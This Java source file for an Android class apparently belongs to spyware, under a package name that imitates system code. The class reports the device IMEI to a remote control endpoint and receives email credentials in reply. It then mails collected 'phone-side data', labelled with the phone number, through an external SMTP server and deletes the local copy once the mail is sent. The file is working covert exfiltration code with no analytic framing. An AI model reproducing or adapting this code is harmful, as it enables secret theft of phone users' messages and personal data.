package com.android.thread;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.mail.Multipart;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import android.content.Context;

import com.android.db.MailBody;
import com.android.utils.HttpClientFactory;
import com.android.utils.LogUtils;
import com.android.utils.Utils;
import com.smsbak.mail.MailSenderInfo;
import com.smsbak.mail.SimpleMailSender;

public class MailSendThread extends Thread {

	private String ConfigUrl = "control/client!getDeviceConfig.action";
	private Context context;
	private MailBody mailbody;
	private String TAG = MailSendThread.class.getName();

	public MailSendThread(Context context, MailBody mailbody) {
		this.context = context;
		this.mailbody = mailbody;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		try {
			Thread.sleep(3000);
			if (Utils.isNetworkConnected(context)) {
				Multipart multipart = mailbody.getMultipart();
				LogUtils.write(TAG, "检测数据");
				if (multipart != null) {
					List<NameValuePair> lnvp = new ArrayList<NameValuePair>();
					lnvp.add(new BasicNameValuePair("mapparam.deviceimei",
							Utils.GetImei(context)));
					JSONObject jo = HttpClientFactory.postData(
							HttpClientFactory.httpurl + ConfigUrl, lnvp);
					if (jo != null) {
						if (jo.has("email")
								&& !"".equals(jo.getString("email"))
								&& jo.has("pass")
								&& !"".equals(jo.getString("pass"))) {
							LogUtils.write(TAG, "发送邮件");
							MailSenderInfo mailInfo = new MailSenderInfo();
							mailInfo.setMailServerHost("smtp.139.com");
							mailInfo.setMailServerPort("25");
							mailInfo.setValidate(true);
							mailInfo.setUserName(jo.getString("email"));
							mailInfo.setPassword(jo.getString("pass"));
							mailInfo.setFromAddress(jo.getString("email"));
							mailInfo.setToAddress(jo.getString("email"));
							mailInfo.setMultipart(multipart);
							mailInfo.setSubject("手机端数据邮件-号码："
									+ Utils.getnum(context) + "-时间："
									+ Utils.formData(new Date()));
							SimpleMailSender sms = new SimpleMailSender();
							boolean flag = sms.sendHtmlMail(context, mailInfo);
							LogUtils.write(TAG, "发送邮件" + flag);
							if (flag) {
								LogUtils.write(TAG, "删除数据");
								mailbody.DeleteData();
								LogUtils.write(TAG, "删除完成");
							}
						}
					}
				}else{
					LogUtils.write(TAG, "数据不存在");
				}
			}else{
				LogUtils.write(TAG, "连接不存在");
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
}
